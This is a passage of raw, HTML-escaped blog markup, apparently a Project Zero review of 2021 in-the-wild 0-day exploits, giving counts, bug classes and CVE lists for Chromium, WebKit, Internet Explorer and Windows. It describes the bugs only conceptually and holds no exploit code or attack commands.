Microsoft, Google Chrome, and Adobe who have been annotating their security bulletins for transparency for multiple years now! And thanks to Apache who also annotated their release notes for &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://httpd.apache.org/security/vulnerabilities_24.html"&gt;CVE-2021-41773&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;this past year. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;In-the-wild 0-days in Qualcomm and ARM products were annotated as in-the-wild in Android security bulletins, but not in the vendor&amp;rsquo;s own security advisories.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;It&amp;#39;s highly likely that in 2021, there were other 0-days that were exploited in the wild and detected, but vendors did not mention this in their release notes. In 2022, we hope that more vendors start noting when they patch vulnerabilities that have been exploited in-the-wild. Until we&amp;rsquo;re confident that all vendors are transparently disclosing in-the-wild status, there&amp;rsquo;s a big question of how many in-the-wild 0-days are discovered, but not labeled publicly by vendors.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="HNYIspzEBn-c11" id="h.s04j4o5mq8tl"&gt;&lt;span&gt;New Year, Old Techniques&lt;/span&gt;&lt;/h1&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;We had a record number of &amp;ldquo;data points&amp;rdquo; in 2021 to understand how attackers are actually using 0-day exploits. A bit surprising to us though, out of all those data points, there was nothing new amongst all this data. 0-day exploits are considered one of the most &lt;/span&gt;&lt;span&gt;advanced&lt;/span&gt;&lt;span&gt;&amp;nbsp;attack methods an actor can use, so it would be easy to conclude that attackers must be using special tricks and attack surfaces. But instead, the 0-days we saw in 2021 generally followed the same bug patterns, attack surfaces, and exploit &amp;ldquo;shapes&amp;rdquo; previously seen in public research. Once &amp;ldquo;0-day is hard&amp;rdquo;, we&amp;rsquo;d expect that to be successful, attackers would have to find new bug classes of vulnerabilities in new attack surfaces using never before seen exploitation methods. &lt;/span&gt;&lt;span&gt;In general, &lt;/span&gt;&lt;span&gt;that wasn&amp;#39;t what the&lt;/span&gt;&lt;span&gt;&amp;nbsp;data showed us this year. With two exceptions (described below in the iOS section) out of the 58, everything we saw was pretty &amp;ldquo;&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.dictionary.com/browse/meh#:~:text=unimpressive%3B%20boring%3A"&gt;meh&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;rdquo; or standard.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Out of the 58 in-the-wild 0-days for the year, 39, or 67% were memory corruption vulnerabilities. Memory corruption vulnerabilities have been the standard for attacking software for the last few decades and it&amp;rsquo;s still how attackers are having success. Out of these memory corruption vulnerabilities, the majority also stuck with very popular and well-known bug classes:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_bfmkl5o48mun-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;17 use-after-free&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;6 out-of-bounds read &amp;amp; write&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;4 buffer overflow&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;4 integer overflow&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;In the next sections we&amp;rsquo;ll dive into each major platform that we saw in-the-wild 0-days for this year. We&amp;rsquo;ll share the trends and explain why what we saw was pretty unexceptional.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.421487jv8qwq"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Chromium (Chrome)&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Chromium had a record high number of 0-days detected and disclosed in 2021 with 14. Out of these 14, 10 were renderer remote code execution bugs, 2 were sandbox escapes, 1 was an infoleak, and 1 was used to open a webpage in Android apps other than Google Chrome.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The 14 0-day vulnerabilities were in the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_1mxsacho6zj1-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;6 JavaScript Engine - v8 (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html"&gt;CVE-2021-21148&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html"&gt;CVE-2021-30551&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/07/stable-channel-update-for-desktop.html"&gt;CVE-2021-30563&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html"&gt;CVE-2021-37975&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/10/stable-channel-update-for-desktop_28.html"&gt;CVE-2021-38003&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;2 DOM Engine - Blink (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_12.html"&gt;CVE-2021-21193&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop.html"&gt;CVE-2021-21206&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 WebGL (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/06/stable-channel-update-for-desktop_17.html"&gt;CVE-2021-30554&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 IndexedDB (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop.html"&gt;CVE-2021-30633&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 webaudio (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Portals (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_24.html"&gt;CVE-2021-37973&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Android Intents (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-38000.html"&gt;CVE-2021-38000&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Core (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_30.html"&gt;CVE-2021-37976&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;When we look at the components targeted by these bugs, they&amp;rsquo;re all attack surfaces seen before in public security research and previous exploits. If anything, there are a few less DOM bugs and more targeting these other components of browsers like IndexedDB and WebGL than previously. 13 out of the 14 Chromium 0-days were memory corruption bugs. Similar to last year, most of those memory corruption bugs are use-after-free vulnerabilities.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;A couple of the Chromium bugs were even similar to previous in-the-wild 0-days. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an issue in &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;ScriptProcessorNode::Process()&lt;/span&gt;&lt;span&gt;&amp;nbsp;in webaudio where there&amp;rsquo;s insufficient locks such that buffers are accessible in both the main thread and the audio rendering thread at the same time. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html"&gt;CVE-2019-13720&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an in-the-wild 0-day from 2019. It was a vulnerability in &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;ConvolverHandler::Process()&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;in webaudio where there were also insufficient locks such that a buffer was accessible in both the main thread and the audio rendering thread at the same time.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is another Chromium in-the-wild 0-day from 2021. It&amp;rsquo;s a type confusion in the &amp;nbsp;TurboFan JIT in Chromium&amp;rsquo;s JavaScript Engine, v8, where Turbofan fails to deoptimize code after a&lt;/span&gt;&lt;span&gt;&amp;nbsp;property map is changed&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html"&gt;CVE-2021-30632&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in particular deals with code that stores global properties. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html"&gt;CVE-2020-16009&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;was also an in-the-wild 0-day that was due to Turbofan failing to deoptimize code after map deprecation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.q5lkhzsdchwk"&gt;&lt;span class="HNYIspzEBn-c12"&gt;WebKit (Safari)&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Prior to 2021, Apple had only acknowledged &lt;/span&gt;&lt;span&gt;1 publicly known in-the-wild 0-day targeting WebKit/Safari, and that was due &lt;/span&gt;&lt;span&gt;the sharing by an external researcher. In 2021 there were 7. This makes it hard for us to assess trends or changes since we don&amp;rsquo;t have historical samples to go off of. Instead, we&amp;rsquo;ll look at 2021&amp;rsquo;s WebKit bugs in the context of other Safari bugs not known to be in-the-wild and other browser in-the-wild 0-days. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The 7 in-the-wild 0-days targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_knibgsincpme-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;4 Javascript Engine - JavaScript Core (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146"&gt;CVE-2021-1870&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146"&gt;CVE-2021-1871&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212336"&gt;CVE-2021-30663&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212336"&gt;CVE-2021-30665&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_grz5i5wr9ig-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 IndexedDB (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html"&gt;CVE-2021-30858&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Storage (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212317"&gt;CVE-2021-30661&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Plugi&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;s (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1879.html"&gt;CVE-2021-1879&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The one semi-surprise is that no DOM bugs were detected and disclosed. In previous years, vulnerabilities in the DOM engine have generally made up 15-20% of the in-the-wild browser 0-days, but none were detected and disclosed for WebKit in 2021. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;It would not be surprising if attackers are beginning to shift to other modules, like third party libraries or things like IndexedDB. The modules may be more promising to attackers going forward because there&amp;rsquo;s a better chance that the vulnerability may exist in multiple browsers or platforms&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;For example, the webaudio bug in Chromium, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html"&gt;CVE-2021-21166&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, also existed in WebKit and was fixed as &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212223"&gt;CVE-2021-1844&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, though there was no evidence it was exploited in-the-wild in WebKit. The IndexedDB in-the-wild 0-day that was used against Safari in 2021, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html"&gt;CVE-2021-30858&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, was very, very similar to a &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1032890"&gt;bug fixed in Chromium in January 2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.pypmw8ahj82o"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Internet Explorer&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Since we began tracking in-the-wild 0-days, Internet Explorer has had a pretty consistent number of 0-days each year. 2021 actually tied 2016 for the most in-the-wild Internet Explorer 0-days we&amp;rsquo;ve ever tracked even though Internet Explorer&amp;rsquo;s market share of web browser users continues to decrease.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEv2CTX5BusrQApQk6Qbg7Gw7nRaqnNvw9rM3vecZitny58CU_peuICwxubQvytpz0IsCl8FlbXIOcpi60ObfVdQK5BNDwxitqQmxXrOQvMMFt9DXgeDZu86EtZwcR58a-UXQlbsCAfoMcAgeaGnLUheSp0W3Ci1GY7lPa8WNHIPsGhBIT58qHBJd28A/s1200/image4.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEv2CTX5BusrQApQk6Qbg7Gw7nRaqnNvw9rM3vecZitny58CU_peuICwxubQvytpz0IsCl8FlbXIOcpi60ObfVdQK5BNDwxitqQmxXrOQvMMFt9DXgeDZu86EtZwcR58a-UXQlbsCAfoMcAgeaGnLUheSp0W3Ci1GY7lPa8WNHIPsGhBIT58qHBJd28A/s600/image4.png" border="0" alt="Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;So why are we seeing so little change in the number of in-the-wild 0-days despite the change in market share? Internet Explorer is still a ripe attack surface for initial entry into Windows machines, even if the user doesn&amp;rsquo;t use Internet Explorer as their Internet browser. While the number of 0-days stayed pretty consistent to what we&amp;rsquo;ve seen in previous years, the components targeted and the delivery methods of the exploits changed. 3 of the 4 0-days seen in 2021 targeted the MSHTML browser engine and were delivered via methods other than the web. Instead they were delivered to targets via Office documents or other file formats. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The four 0-days targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_bqyk3pvm93qj-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;MSHTML browser engine (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-33742.html"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;Javascript Engine - JScript9 (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34448"&gt;CVE-2021-34448&lt;/a&gt;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;t&lt;/span&gt;&lt;span&gt;argets of the campaign initially received a &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;.mht&lt;/span&gt;&lt;span&gt;&amp;nbsp;file, which prompted the user to open in Internet Explorer. Once it was opened in Internet Explorer, the exploit was downloaded and run. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;were delivered to targets via malicious Office documents.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html"&gt;CVE-2021-26411&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html"&gt;CVE-2021-33742&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;were two common memory corruption bug patterns: a use-after-free due to a user controlled callback in between two actions using an object and the user frees the object during that callback and a buffer overflow.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;There were a few different vulnerabilities used in the exploit chain that used &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but the one within MSHTML was that as soon as the Office document was opened the payload would run: a CAB file was downloaded, decompressed, and then a function from within a DLL in that CAB was executed. Unlike the previous two MSHTML bugs, this was a logic error in URL parsing rather than a memory corruption bug.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.i2yh4xx4r7n0"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Windows&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Windows is the platform where we&amp;rsquo;ve seen the most change in components targeted compared with previous years. However, this shift has generally been in progress for a few years and predicted with the end-of-life of Windows 7 in 2020 and thus why it&amp;rsquo;s still not especially novel.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;In 2021 there were 10 Windows in-the-wild 0-days targeting 7 different components:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_rvy0q9fw47sg-0 start"&gt;&lt;li style="margin-left: 